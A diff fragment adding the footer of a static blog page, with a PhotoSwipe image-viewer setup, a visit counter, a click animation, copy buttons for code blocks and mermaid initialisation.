+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
